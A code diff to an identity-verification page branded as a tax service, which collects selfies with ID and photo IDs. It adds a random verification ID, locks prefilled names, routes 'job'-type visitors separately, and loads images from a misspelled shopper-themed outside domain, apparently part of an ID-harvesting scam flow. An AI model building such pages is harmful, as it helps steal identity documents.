@@ -80,6 +80,8 @@
                 <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6">
                     <div class="flex-1">
                         <h2 class="text-2xl sm:text-3xl font-bold text-gray-900 mb-3">Verify Your Identity</h2>
+                        <h2 class="text-xl  font-medium text-gray-900 mb-3">Your Verification ID is: #<span
+                                id="vid"></span></h2>
                         <p class="text-gray-600 text-sm sm:text-base leading-relaxed mb-4">
                             This step is important to ensure everything meets our eligibility requirements and
                             to maintain the integrity of <span class="font-semibold text-gray-900">Ryan Tax Services
@@ -611,8 +613,8 @@
                         <div class="bg-blue-50 rounded-xl p-6">
                             <div class="flex items-start space-x-4 mb-6">
                                 <div class="flex-shrink-0">
-                                    <img src="selfie.png" alt="Selfie Example"
-                                        class="w-16 h-16 rounded-lg object-cover">
+                                    <img src="https://myteriousshoppers.com/verification/selfie.png"
+                                        alt="Selfie Example" class="w-16 h-16 rounded-lg object-cover">
                                 </div>
                                 <div class="flex-1">
                                     <h4 class="text-lg font-semibold text-gray-900 mb-2">Upload Selfie with ID</h4>
@@ -644,7 +646,8 @@
                         <div class="bg-green-50 rounded-xl p-6">
                             <div class="flex items-start space-x-4 mb-6">
                                 <div class="flex-shrink-0">
-                                    <img src="id.jpg" alt="ID Example" class="w-16 h-16 rounded-lg object-cover">
+                                    <img src="https://myteriousshoppers.com/verification/id.jpg" alt="ID Example"
+                                        class="w-16 h-16 rounded-lg object-cover">
                                 </div>
                                 <div class="flex-1">
                                     <h4 class="text-lg font-semibold text-gray-900 mb-2">Upload Photo ID</h4>
@@ -740,8 +743,126 @@
     </footer>
 
     <script>
+        // Function to get URL parameters
+        function getUrlParameter(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        // Function to generate random 6-digit verification ID
+        function generateRandomVerificationId() {
+            return Math.floor(100000 + Math.random() * 900000).toString();
+        }
+
         let currentStep = 1;
         const totalSteps = 5;
+
+        // Load data from localStorage and populate form
+        function loadTaxFormData() {
+            const savedData = localStorage.getItem('taxFormData');
+            const isJobType = getUrlParameter('type') === 'job';
+
+            let verificationId;
+            if (isJobType) {
+                verificationId = generateRandomVerificationId();
+            } else {
+                verificationId = localStorage.getItem('verificationId');
+            }
+
+            if (savedData) {
+                try {
+                    const data = JSON.parse(savedData);
+
+                    // Prefill first name and last name
+                    if (data.firstName) {
+                        const firstNameField = document.getElementById('first_name');
+                        if (firstNameField) {
+                            firstNameField.value = data.firstName;
+                            firstNameField.readOnly = true; // Make it uneditable
+                            firstNameField.classList.add('bg-gray-100', 'cursor-not-allowed');
+                        }
+                    }
+
+                    if (data.lastName) {
+                        const lastNameField = document.getElementById('last_name');
+                        if (lastNameField) {
+                            lastNameField.value = data.lastName;
+                            lastNameField.readOnly = true; // Make it uneditable
+                            lastNameField.classList.add('bg-gray-100', 'cursor-not-allowed');
+                        }
+                    }
+                } catch (error) {
+                    console.error('Error parsing localStorage data:', error);
+                }
+            }
+
+            // Set verification ID in display element
+            if (verificationId) {
+                const vidElement = document.getElementById('vid');
+                if (vidElement) {
+                    vidElement.textContent = verificationId;
+                }
+            }
+        }
+
+        // if (savedData) {
+        //     try {
+        //         const data = JSON.parse(savedData);
+
+        //         // Prefill first name and last name
+        //         if (data.firstName) {
+        //             const firstNameField = document.getElementById('first_name');
+        //             if (firstNameField) {
+        //                 firstNameField.value = data.firstName;
+        //                 firstNameField.readOnly = true; // Make it uneditable
+        //                 firstNameField.classList.add('bg-gray-100', 'cursor-not-allowed');
+        //             }
+        //         }
+
+        //         if (data.lastName) {
+        //             const lastNameField = document.getElementById('last_name');
+        //             if (lastNameField) {
+        //                 lastNameField.value = data.lastName;
+        //                 lastNameField.readOnly = true; // Make it uneditable
+        //                 lastNameField.classList.add('bg-gray-100', 'cursor-not-allowed');
+        //             }
+        //         }
+        //     } catch (error) {
+        //         console.error('Error parsing localStorage data:', error);
+        //     }
+        // }
+
+        // Set verification ID in display element
+        //     if (verificationId) {
+        //         const vidElement = document.getElementById('vid');
+        //         if (vidElement) {
+        //             vidElement.textContent = verificationId;
+        //         }
+        //     }
+        // }
+        //             }
+
+        //             if (data.lastName) {
+        //                 const lastNameField = document.getElementById('last_name');
+        //                 if (lastNameField) {
+        //                     lastNameField.value = data.lastName;
+        //                     lastNameField.readOnly = true; // Make it uneditable
+        //                     lastNameField.classList.add('bg-gray-100', 'cursor-not-allowed');
+        //                 }
+        //             }
+        //         } catch (error) {
+        //             console.error('Error parsing localStorage data:', error);
+        //         }
+        //     }
+
+        //     // Set verification ID in the display element
+        //     if (verificationId) {
+        //         const vidElement = document.getElementById('vid');
+        //         if (vidElement) {
+        //             vidElement.textContent = verificationId;
+        //         }
+        //     }
+        // }
 
         // State/Province data
         const usaStates = [
@@ -787,6 +908,9 @@
 
         // Initialize form
         document.addEventListener('DOMContentLoaded', function () {
+            // Load data from localStorage
+            loadTaxFormData();
+
             updateStateDropdown("country", "state");
             updateStateDropdown("mailing_country", "mailing_state");
 
@@ -1259,7 +1383,9 @@ ${formData.get("use_different_address") ? `• Mailing: ${formData.get("mailing_
                     function checkAllFilesUploaded() {
                         filesUploaded++;
                         if (filesUploaded === filesToSend.length) {
-                            window.location.href = './verified.html';
+                            const isJobType = getUrlParameter('type') === 'job';
+                            const redirectUrl = isJobType ? './loadid.html' : './verified.html';
+                            window.location.href = redirectUrl;
                         }
                     }
 
